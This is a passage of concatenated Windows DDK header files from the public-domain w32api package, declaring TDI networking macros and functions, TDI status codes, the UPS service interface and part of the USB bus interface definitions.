 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN UINT  QType,
 *   IN PMDL  MdlAddr);
 */
#define TdiBuildQueryInformation(                                        \
  Irp, DevObj, FileObj, CompRoutine, Contxt, QType, MdlAddr)             \
{                                                                        \
  PTDI_REQUEST_KERNEL_QUERY_INFORMATION _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                             \
                                                                         \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                               \
                                                                         \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                     \
                  Contxt, _IrpSp, TDI_QUERY_INFORMATION);                \
                                                                         \
  _Request = (PTDI_REQUEST_KERNEL_QUERY_INFORMATION)&_IrpSp->Parameters; \
  _Request->RequestConnectionInformation = NULL;                         \
  _Request->QueryType = (ULONG)(QType);                                  \
  (Irp)->MdlAddress   = (MdlAddr);                                       \
}

/*
 * VOID
 * TdiBuildReceive(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PMDL  MdlAddr,
 *   IN ULONG  InFlags,
 *   IN ULONG  ReceiveLen);
 */
#define TdiBuildReceive(                                       \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                   \
  MdlAddr, InFlags, ReceiveLen)                                \
{                                                              \
  PTDI_REQUEST_KERNEL_RECEIVE _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                   \
                                                               \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                     \
                                                               \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,           \
                  Contxt, _IrpSp, TDI_RECEIVE);                \
                                                               \
  _Request = (PTDI_REQUEST_KERNEL_RECEIVE)&_IrpSp->Parameters; \
  _Request->ReceiveFlags  = (InFlags);                         \
  _Request->ReceiveLength = (ReceiveLen);                      \
  (Irp)->MdlAddress       = (MdlAddr);                         \
}

/*
 * VOID
 * TdiBuildReceiveDatagram(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PMDL  MdlAddr,
 *   IN ULONG  ReceiveLen,
 *   IN PTDI_CONNECTION_INFORMATION  ReceiveDatagramInfo,
 *   OUT PTDI_CONNECTION_INFORMATION  ReturnInfo,
 *   ULONG InFlags);
 */
#define TdiBuildReceiveDatagram(                                 \
  Irp, DevObj, FileObj, CompRoutine, Contxt, MdlAddr,            \
  ReceiveLen, ReceiveDatagramInfo, ReturnInfo, InFlags)          \
{                                                                \
  PTDI_REQUEST_KERNEL_RECEIVEDG _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                     \
                                                                 \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                       \
                                                                 \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,             \
                  Contxt, _IrpSp, TDI_RECEIVE_DATAGRAM);         \
                                                                 \
  _Request = (PTDI_REQUEST_KERNEL_RECEIVEDG)&_IrpSp->Parameters; \
  _Request->ReceiveDatagramInformation = (ReceiveDatagramInfo);  \
  _Request->ReturnDatagramInformation  = (ReturnInfo);           \
  _Request->ReceiveLength = (ReceiveLen);                        \
  _Request->ReceiveFlags  = (InFlags);                           \
  (Irp)->MdlAddress       = (MdlAddr);                           \
}

/*
 * VOID
 * TdiBuildSend(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PMDL  MdlAddr,
 *   IN ULONG  InFlags,
 *   IN ULONG  SendLen);
 */
#define TdiBuildSend(                                       \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                \
  MdlAddr, InFlags, SendLen)                                \
{                                                           \
  PTDI_REQUEST_KERNEL_SEND _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                \
                                                            \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                  \
                                                            \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,        \
                  Contxt, _IrpSp, TDI_SEND);                \
                                                            \
  _Request = (PTDI_REQUEST_KERNEL_SEND)&_IrpSp->Parameters; \
  _Request->SendFlags  = (InFlags);                         \
  _Request->SendLength = (SendLen);                         \
  (Irp)->MdlAddress    = (MdlAddr);                         \
}

/*
 * VOID
 * TdiBuildSendDatagram(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PMDL  MdlAddr,
 *   IN ULONG  SendLen,
 *   IN PTDI_CONNECTION_INFORMATION  SendDatagramInfo);
 */
#define TdiBuildSendDatagram(                                 \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                  \
  MdlAddr, SendLen, SendDatagramInfo)                         \
{                                                             \
  PTDI_REQUEST_KERNEL_SENDDG _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                  \
                                                              \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                    \
                                                              \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,          \
                  Contxt, _IrpSp, TDI_SEND_DATAGRAM);         \
                                                              \
  _Request = (PTDI_REQUEST_KERNEL_SENDDG)&_IrpSp->Parameters; \
  _Request->SendDatagramInformation = (SendDatagramInfo);     \
  _Request->SendLength = (SendLen);                           \
  (Irp)->MdlAddress    = (MdlAddr);                           \
}

/*
 * VOID
 * TdiBuildSetEventHandler(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN INT  InEventType,
 *   IN PVOID  InEventHandler,
 *   IN PVOID  InEventContext);
 */
#define TdiBuildSetEventHandler(                                 \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                     \
  InEventType, InEventHandler, InEventContext)                   \
{                                                                \
  PTDI_REQUEST_KERNEL_SET_EVENT _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                     \
                                                                 \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                       \
                                                                 \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,             \
                  Contxt, _IrpSp, TDI_SET_EVENT_HANDLER);        \
                                                                 \
  _Request = (PTDI_REQUEST_KERNEL_SET_EVENT)&_IrpSp->Parameters; \
  _Request->EventType    = (InEventType);                        \
  _Request->EventHandler = (PVOID)(InEventHandler);              \
  _Request->EventContext = (PVOID)(InEventContext);              \
}

/*
 * VOID
 * TdiBuildSetInformation(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN UINT  SType,
 *   IN PMDL  MdlAddr);
 */
#define TdiBuildSetInformation(                                        \
  Irp, DevObj, FileObj, CompRoutine, Contxt, SType, MdlAddr)           \
{                                                                      \
  PTDI_REQUEST_KERNEL_SET_INFORMATION _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                           \
                                                                       \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                             \
                                                                       \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                   \
                  Contxt, _IrpSp, TDI_SET_INFORMATION);                \
                                                                       \
  _Request = (PTDI_REQUEST_KERNEL_SET_INFORMATION)&_IrpSp->Parameters; \
  _Request->RequestConnectionInformation = NULL;                       \
  _Request->SetType = (ULONG)(SType);                                  \
  (Irp)->MdlAddress = (MdlAddr);                                       \
}

/* TDI20_CLIENT_INTERFACE_INFO.TdiVersion constants */
#define TDI_CURRENT_MAJOR_VERSION         2
#define TDI_CURRENT_MINOR_VERSION         0

#define TDI_CURRENT_VERSION ((TDI_CURRENT_MINOR_VERSION) << 8 \
  | (TDI_CURRENT_MAJOR_VERSION))

#define TDI_VERSION_ONE                   0x0001

typedef enum _TDI_PNP_OPCODE {
  TDI_PNP_OP_MIN,
  TDI_PNP_OP_ADD,
  TDI_PNP_OP_DEL,
  TDI_PNP_OP_UPDATE,
  TDI_PNP_OP_PROVIDERREADY,
  TDI_PNP_OP_NETREADY,
  TDI_PNP_OP_ADD_IGNORE_BINDING,
  TDI_PNP_OP_DELETE_IGNORE_BINDING,
  TDI_PNP_OP_MAX
} TDI_PNP_OPCODE;

/* TDI_PNP_CONTEXT.ContextType */
#define TDI_PNP_CONTEXT_TYPE_IF_NAME            0x1
#define TDI_PNP_CONTEXT_TYPE_IF_ADDR            0x2
#define TDI_PNP_CONTEXT_TYPE_PDO                0x3
#define TDI_PNP_CONTEXT_TYPE_FIRST_OR_LAST_IF   0x4

typedef struct _TDI_PNP_CONTEXT {
  USHORT  ContextSize;
  USHORT  ContextType;
  UCHAR  ContextData[1];
} TDI_PNP_CONTEXT, *PTDI_PNP_CONTEXT;

typedef VOID
(NTAPI *TDI_ADD_ADDRESS_HANDLER)(
  IN PTA_ADDRESS  Address);

typedef VOID
(NTAPI *TDI_ADD_ADDRESS_HANDLER_V2)(
  IN PTA_ADDRESS  Address,
  IN PUNICODE_STRING  DeviceName,
  IN PTDI_PNP_CONTEXT  Context);

typedef VOID
(NTAPI *TDI_BINDING_HANDLER)(
  IN TDI_PNP_OPCODE  PnPOpcode,
  IN PUNICODE_STRING  DeviceName,
  IN PWSTR  MultiSZBindList);

typedef VOID
(NTAPI *TDI_BIND_HANDLER)(
  IN PUNICODE_STRING  DeviceName);

typedef VOID
(NTAPI *TDI_DEL_ADDRESS_HANDLER)(
  IN PTA_ADDRESS  Address);

typedef VOID
(NTAPI *TDI_DEL_ADDRESS_HANDLER_V2)(
  IN PTA_ADDRESS  Address,
  IN PUNICODE_STRING  DeviceName,
  IN PTDI_PNP_CONTEXT  Context);

typedef NTSTATUS
(NTAPI *TDI_PNP_POWER_HANDLER)(
  IN PUNICODE_STRING  DeviceName,
  IN PNET_PNP_EVENT  PowerEvent,
  IN PTDI_PNP_CONTEXT  Context1,
  IN PTDI_PNP_CONTEXT  Context2);

typedef VOID
(NTAPI *TDI_UNBIND_HANDLER)(
  IN PUNICODE_STRING  DeviceName);

typedef VOID
(NTAPI *ProviderPnPPowerComplete)(
  IN PNET_PNP_EVENT  NetEvent,
  IN NTSTATUS  ProviderStatus);

typedef struct _TDI20_CLIENT_INTERFACE_INFO {
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      UCHAR  MajorTdiVersion;
      UCHAR  MinorTdiVersion;
    } DUMMYSTRUCTNAME;
    USHORT TdiVersion;
  } DUMMYUNIONNAME;
  USHORT  Unused;
  PUNICODE_STRING  ClientName;
  TDI_PNP_POWER_HANDLER  PnPPowerHandler;
  _ANONYMOUS_UNION union {
    TDI_BINDING_HANDLER  BindingHandler;
    _ANONYMOUS_STRUCT struct {
      TDI_BIND_HANDLER  BindHandler;
      TDI_UNBIND_HANDLER  UnBindHandler;
    } DUMMYSTRUCTNAME;
  }DUMMYUNIONNAME2;
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      TDI_ADD_ADDRESS_HANDLER_V2  AddAddressHandlerV2;
      TDI_DEL_ADDRESS_HANDLER_V2  DelAddressHandlerV2;
    } DUMMYSTRUCTNAME;
    _ANONYMOUS_STRUCT struct {
      TDI_ADD_ADDRESS_HANDLER  AddAddressHandler;
      TDI_DEL_ADDRESS_HANDLER  DelAddressHandler;
    } DUMMYSTRUCTNAME2;
  } DUMMYUNIONNAME3;
} TDI20_CLIENT_INTERFACE_INFO, *PTDI20_CLIENT_INTERFACE_INFO;

typedef TDI20_CLIENT_INTERFACE_INFO TDI_CLIENT_INTERFACE_INFO;
typedef TDI_CLIENT_INTERFACE_INFO *PTDI_CLIENT_INTERFACE_INFO;


/* TDI functions */

/*
 * VOID
 * TdiCompleteRequest(
 *   IN PIRP Irp,
 *   IN NTSTATUS Status);
 */
#define TdiCompleteRequest(Irp, Status)           \
{                                                 \
  (Irp)->IoStatus.Status = (Status);              \
  IoCompleteRequest((Irp), IO_NETWORK_INCREMENT); \
}

TDIKRNLAPI
NTSTATUS
NTAPI
TdiCopyBufferToMdl(
  IN PVOID  SourceBuffer,
  IN ULONG  SourceOffset,
  IN ULONG  SourceBytesToCopy,
  IN PMDL  DestinationMdlChain,
  IN ULONG  DestinationOffset,
  IN PULONG  BytesCopied);

/*
 * VOID
 * TdiCopyLookaheadData(
 *   IN PVOID  Destination,
 *   IN PVOID  Source,
 *   IN ULONG  Length,
 *   IN ULONG  ReceiveFlags);
 */
#define TdiCopyLookaheadData(Destination, Source, Length, ReceiveFlags) \
  RtlCopyMemory(Destination, Source, Length)

TDIKRNLAPI
NTSTATUS
NTAPI
TdiCopyMdlChainToMdlChain (
  IN PMDL  SourceMdlChain,
  IN ULONG  SourceOffset,
  IN PMDL  DestinationMdlChain,
  IN ULONG  DestinationOffset,
  OUT PULONG  BytesCopied);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiCopyMdlToBuffer(
  IN PMDL  SourceMdlChain,
  IN ULONG  SourceOffset,
  IN PVOID  DestinationBuffer,
  IN ULONG  DestinationOffset,
  IN ULONG  DestinationBufferSize,
  OUT PULONG  BytesCopied);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDeregisterAddressChangeHandler(
  IN HANDLE  BindingHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDeregisterDeviceObject(
  IN HANDLE  DevRegistrationHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDeregisterNetAddress(
  IN HANDLE  AddrRegistrationHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDeregisterPnPHandlers(
  IN HANDLE  BindingHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDeregisterProvider(
  IN HANDLE  ProviderHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiEnumerateAddresses(
  IN HANDLE  BindingHandle);

TDIKRNLAPI
VOID
NTAPI
TdiInitialize(
  VOID);

TDIKRNLAPI
VOID
NTAPI
TdiMapBuffer(
  IN PMDL  MdlChain);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiMapUserRequest(
  IN PDEVICE_OBJECT  DeviceObject,
  IN PIRP  Irp,
  IN PIO_STACK_LOCATION  IrpSp);

TDIKRNLAPI
BOOLEAN
NTAPI
TdiMatchPdoWithChainedReceiveContext(
  IN PVOID TsduDescriptor,
  IN PVOID PDO);

TDIKRNLAPI
VOID
NTAPI
TdiPnPPowerComplete(
  IN HANDLE  BindingHandle,
  IN PNET_PNP_EVENT  PowerEvent,
  IN NTSTATUS  Status);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiPnPPowerRequest(
  IN PUNICODE_STRING  DeviceName,
  IN PNET_PNP_EVENT  PowerEvent,
  IN PTDI_PNP_CONTEXT  Context1,
  IN PTDI_PNP_CONTEXT  Context2,
  IN ProviderPnPPowerComplete  ProtocolCompletionHandler);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiProviderReady(
  IN HANDLE  ProviderHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiRegisterAddressChangeHandler(
  IN TDI_ADD_ADDRESS_HANDLER  AddHandler,
  IN TDI_DEL_ADDRESS_HANDLER  DeleteHandler,
  OUT HANDLE  *BindingHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiRegisterDeviceObject(
  IN PUNICODE_STRING  DeviceName,
  OUT HANDLE  *DevRegistrationHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiRegisterNetAddress(
  IN PTA_ADDRESS  Address,
  IN PUNICODE_STRING  DeviceName,
  IN PTDI_PNP_CONTEXT  Context,
  OUT HANDLE  *AddrRegistrationHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiRegisterNotificationHandler(
  IN TDI_BIND_HANDLER  BindHandler,
  IN TDI_UNBIND_HANDLER  UnbindHandler,
  OUT HANDLE  *BindingHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiRegisterPnPHandlers(
  IN PTDI_CLIENT_INTERFACE_INFO  ClientInterfaceInfo,
  IN ULONG  InterfaceInfoSize,
  OUT HANDLE  *BindingHandle);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiRegisterProvider(
  IN PUNICODE_STRING  ProviderName,
  OUT HANDLE  *ProviderHandle);

TDIKRNLAPI
VOID
NTAPI
TdiReturnChainedReceives(
  IN PVOID  *TsduDescriptors,
  IN ULONG   NumberOfTsdus);

TDIKRNLAPI
VOID
NTAPI
TdiUnmapBuffer(
  IN PMDL  MdlChain);

#ifdef __cplusplus
}
#endif

#endif /* __TDIKRNL_H */

```

`include/ddk/tdistat.h`:

```h
/*
 * tdistat.h
 *
 * TDI status codes
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __TDISTAT_H
#define __TDISTAT_H

#ifdef __cplusplus
extern "C" {
#endif

#define TDI_SUCCESS                       STATUS_SUCCESS
#define TDI_NO_RESOURCES                  STATUS_INSUFFICIENT_RESOURCES
#define TDI_ADDR_IN_USE                   STATUS_ADDRESS_ALREADY_EXISTS
#define TDI_BAD_ADDR                      STATUS_INVALID_ADDRESS_COMPONENT
#define TDI_NO_FREE_ADDR                  STATUS_TOO_MANY_ADDRESSES
#define TDI_ADDR_INVALID                  STATUS_INVALID_ADDRESS
#define TDI_ADDR_DELETED                  STATUS_ADDRESS_CLOSED
#define TDI_BUFFER_OVERFLOW               STATUS_BUFFER_OVERFLOW
#define TDI_BAD_EVENT_TYPE                STATUS_INVALID_PARAMETER
#define TDI_BAD_OPTION                    STATUS_INVALID_PARAMETER
#define TDI_CONN_REFUSED                  STATUS_CONNECTION_REFUSED
#define TDI_INVALID_CONNECTION            STATUS_CONNECTION_INVALID
#define TDI_ALREADY_ASSOCIATED            STATUS_ADDRESS_ALREADY_ASSOCIATED
#define TDI_NOT_ASSOCIATED                STATUS_ADDRESS_NOT_ASSOCIATED
#define TDI_CONNECTION_ACTIVE             STATUS_CONNECTION_ACTIVE
#define TDI_CONNECTION_ABORTED            STATUS_CONNECTION_ABORTED
#define TDI_CONNECTION_RESET              STATUS_CONNECTION_RESET
#define TDI_TIMED_OUT                     STATUS_IO_TIMEOUT
#define TDI_GRACEFUL_DISC                 STATUS_GRACEFUL_DISCONNECT
#define TDI_NOT_ACCEPTED                  STATUS_DATA_NOT_ACCEPTED
#define TDI_MORE_PROCESSING               STATUS_MORE_PROCESSING_REQUIRED
#define TDI_INVALID_STATE                 STATUS_INVALID_DEVICE_STATE
#define TDI_INVALID_PARAMETER             STATUS_INVALID_PARAMETER
#define TDI_DEST_NET_UNREACH              STATUS_NETWORK_UNREACHABLE
#define TDI_DEST_HOST_UNREACH             STATUS_HOST_UNREACHABLE
#define TDI_DEST_UNREACHABLE              TDI_DEST_HOST_UNREACH
#define TDI_DEST_PROT_UNREACH             STATUS_PROTOCOL_UNREACHABLE
#define TDI_DEST_PORT_UNREACH             STATUS_PORT_UNREACHABLE
#define TDI_INVALID_QUERY                 STATUS_INVALID_DEVICE_REQUEST
#define TDI_REQ_ABORTED                   STATUS_REQUEST_ABORTED
#define TDI_BUFFER_TOO_SMALL              STATUS_BUFFER_TOO_SMALL
#define TDI_CANCELLED                     STATUS_CANCELLED
#define TDI_BUFFER_TOO_BIG                STATUS_INVALID_BUFFER_SIZE
#define TDI_INVALID_REQUEST               STATUS_INVALID_DEVICE_REQUEST
#define TDI_PENDING                       STATUS_PENDING
#define TDI_ITEM_NOT_FOUND                STATUS_OBJECT_NAME_NOT_FOUND

#define TDI_STATUS_BAD_VERSION            0xC0010004L
#define TDI_STATUS_BAD_CHARACTERISTICS    0xC0010005L

#define TDI_OPTION_EOL                    0

#define TDI_ADDRESS_OPTION_REUSE          1
#define TDI_ADDRESS_OPTION_DHCP           2

#ifdef __cplusplus
}
#endif

#endif /* __TDISTAT_H */

```

`include/ddk/upssvc.h`:

```h
/*
 * upssvc.h
 *
 * UPS service interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __UPSSVC_H
#define __UPSSVC_H

#ifdef __cplusplus
extern "C" {
#endif

#if defined(_APCUPS_)
#define UPSAPI
#else
#define UPSAPI DECLSPEC_IMPORT
#endif


#define UPS_ONLINE                        1
#define UPS_ONBATTERY                     2
#define UPS_LOWBATTERY                    4
#define UPS_NOCOMM                        8
#define UPS_CRITICAL                      16

UPSAPI
VOID
NTAPI
UPSCancelWait(VOID);

UPSAPI
DWORD
NTAPI
UPSGetState(VOID);

#define UPS_INITUNKNOWNERROR              0
#define UPS_INITOK                        1
#define UPS_INITNOSUCHDRIVER              2
#define UPS_INITBADINTERFACE              3
#define UPS_INITREGISTRYERROR             4
#define UPS_INITCOMMOPENERROR             5
#define UPS_INITCOMMSETUPERROR            6

UPSAPI
DWORD
NTAPI
UPSInit(VOID);

UPSAPI
VOID
NTAPI
UPSStop(VOID);

UPSAPI
VOID
NTAPI
UPSTurnOff(
  IN DWORD  aTurnOffDelay);

UPSAPI
VOID
NTAPI
UPSWaitForStateChange(
  IN DWORD  aCurrentState,
  IN DWORD  anInterval);

#ifdef __cplusplus
}
#endif

#endif /* __UPSSVC_H */

```

`include/ddk/usbbusif.h`:

```h
#pragma once

#define _USBBUSIF_

#ifndef USB_BUSIFFN
#if defined(_ARM_)
#define USB_BUSIFFN
#else
#define USB_BUSIFFN __stdcall
#endif
#endif

#if (NTDDI_VERSION >= NTDDI_WINXP)

#if !defined(_HUBBUSIF_)
typedef PVOID PUSB_DEVICE_HANDLE;
#endif

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_SUBMIT_ISO_OUT_URB) (
  IN PVOID,
  IN PURB);

#define USB_HCD_CAPS_SUPPORTS_RT_THREADS    0x00000001

typedef VOID
(USB_BUSIFFN *PUSB_BUSIFFN_GETUSBDI_VERSION) (
  IN PVOID,
  OUT PUSBD_VERSION_INFORMATION OPTIONAL,
  OUT PULONG OPTIONAL);

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_QUERY_BUS_TIME) (
  IN PVOID,
  OUT PULONG OPTIONAL);

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_ENUM_LOG_ENTRY) (
  IN PVOID,
  IN ULONG,
  IN ULONG,
  IN ULONG,
  IN ULONG);

typedef struct _USB_BUS_INFORMATION_LEVEL_0 {
  ULONG TotalBandwidth;
  ULONG ConsumedBandwidth;
} USB_BUS_INFORMATION_LEVEL_0, *PUSB_BUS_INFORMATION_LEVEL_0;

typedef struct _USB_BUS_INFORMATION_LEVEL_1 {
  ULONG TotalBandwidth;
  ULONG ConsumedBandwidth;
  ULONG ControllerNameLength;
  WCHAR ControllerNameUnicodeString[1];
} USB_BUS_INFORMATION_LEVEL_1, *PUSB_BUS_INFORMATION_LEVEL_1;

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_QUERY_BUS_INFORMATION) (
  IN PVOID,
  IN ULONG,
  IN OUT PVOID,
  OUT PULONG,
  OUT PULONG OPTIONAL);

typedef BOOLEAN
(USB_BUSIFFN *PUSB_BUSIFFN_IS_DEVICE_HIGH_SPEED) (
  IN PVOID OPTIONAL);

#define USB_BUSIF_USBDI_VERSION_0         0x0000
#define USB_BUSIF_USBDI_VERSION_1         0x0001
#define USB_BUSIF_USBDI_VERSION_2         0x0002
#define USB_BUSIF_USBDI_VERSION_3         0x0003

DEFINE_GUID(USB_BUS_INTERFACE_USBDI_GUID, 
0xb1a96a13, 0x3de0, 0x4574, 0x9b, 0x1, 0xc0, 0x8f, 0xea, 0xb3, 0x18, 0xd6);

typedef struct _USB_BUS_INTERFACE_USBDI_V0 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_GETUSBDI_VERSION GetUSBDIVersion;
  PUSB_BUSIFFN_QUERY_BUS_TIME QueryBusTime;
  PUSB_BUSIFFN_SUBMIT_ISO_OUT_URB SubmitIsoOutUrb;
  PUSB_BUSIFFN_QUERY_BUS_INFORMATION QueryBusInformation;
} USB_BUS_INTERFACE_USBDI_V0, *PUSB_BUS_INTERFACE_USBDI_V0;

typedef struct _USB_BUS_INTERFACE_USBDI_V1 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_GETUSBDI_VERSION GetUSBDIVersion;
  PUSB_BUSIFFN_QUERY_BUS_TIME QueryBusTime;
  PUSB_BUSIFFN_SUBMIT_ISO_OUT_URB SubmitIsoOutUrb;
  PUSB_BUSIFFN_QUERY_BUS_INFORMATION QueryBusInformation;
  PUSB_BUSIFFN_IS_DEVICE_HIGH_SPEED IsDeviceHighSpeed;
} USB_BUS_INTERFACE_USBDI_V1, *PUSB_BUS_INTERFACE_USBDI_V1;

typedef struct _USB_BUS_INTERFACE_USBDI_V2 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_GETUSBDI_VERSION GetUSBDIVersion;
  PUSB_BUSIFFN_QUERY_BUS_TIME QueryBusTime;
  PUSB_BUSIFFN_SUBMIT_ISO_OUT_URB SubmitIsoOutUrb;
  PUSB_BUSIFFN_QUERY_BUS_INFORMATION QueryBusInformation;
  PUSB_BUSIFFN_IS_DEVICE_HIGH_SPEED IsDeviceHighSpeed;
  PUSB_BUSIFFN_ENUM_LOG_ENTRY EnumLogEntry;
} USB_BUS_INTERFACE_USBDI_V2, *PUSB_BUS_INTERFACE_USBDI_V2;

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_QUERY_BUS_TIME_EX) (
  IN PVOID OPTIONAL,
  OUT PULONG OPTIONAL);

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_QUERY_CONTROLLER_TYPE) (
  IN PVOID OPTIONAL,
  OUT PULONG OPTIONAL,
  OUT PUSHORT OPTIONAL,
  OUT PUSHORT OPTIONAL,
  OUT PUCHAR OPTIONAL,
  OUT PUCHAR OPTIONAL,
  OUT PUCHAR OPTIONAL,
  OUT PUCHAR OPTIONAL);

typedef struct _USB_BUS_INTERFACE_USBDI_V3 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_GETUSBDI_VERSION GetUSBDIVersion;
  PUSB_BUSIFFN_QUERY_BUS_TIME QueryBusTime;
  PUSB_BUSIFFN_SUBMIT_ISO_OUT_URB SubmitIsoOutUrb;
  PUSB_BUSIFFN_QUERY_BUS_INFORMATION QueryBusInformation;
  PUSB_BUSIFFN_IS_DEVICE_HIGH_SPEED IsDeviceHighSpeed;
  PUSB_BUSIFFN_ENUM_LOG_ENTRY EnumLogEntry;
  PUSB_BUSIFFN_QUERY_BUS_TIME_EX QueryBusTimeEx;
  PUSB_BUSIFFN_QUERY_CONTROLLER_TYPE QueryControllerType;
} USB_BUS_INTERFACE_USBDI_V3, *PUSB_BUS_INTERFACE_USBDI_V3;

DEFINE_GUID(USB_BUS_INTERFACE_USBC_CONFIGURATION_GUID,
	0x893b6a96, 0xb7f, 0x4d4d, 0xbd, 0xb4, 0xbb, 0xd4, 0xce, 0xeb, 0xb3, 0x1c);

#define USBC_FUNCTION_FLAG_APPEND_ID 0x1

typedef struct _USBC_FUNCTION_DESCRIPTOR{
  UCHAR FunctionNumber;
  UCHAR NumberOfInterfaces;
  PUSB_INTERFACE_DESCRIPTOR *InterfaceDescriptorList;
  UNICODE_STRING HardwareId;
  UNICODE_STRING CompatibleId;
  UNICODE_STRING FunctionDescription;
  ULONG FunctionFlags;
  PVOID Reserved;
} USBC_FUNCTION_DESCRIPTOR, *PUSBC_FUNCTION_DESCRIPTOR;

typedef
NTSTATUS
(USB_BUSIFFN *USBC_START_DEVICE_CALLBACK)(
  IN PUSB_DEVICE_DESCRIPTOR DeviceDescriptor,
  IN PUSB_CONFIGURATION_DESCRIPTOR ConfigurationDescriptor,
  OUT PUSBC_FUNCTION_DESCRIPTOR *FunctionDescriptorBuffer,
  OUT PULONG FunctionDescriptorBufferLength,
  IN PDEVICE_OBJECT FdoDeviceObject,
  IN PDEVICE_OBJECT PdoDeviceObject);

typedef
BOOLEAN
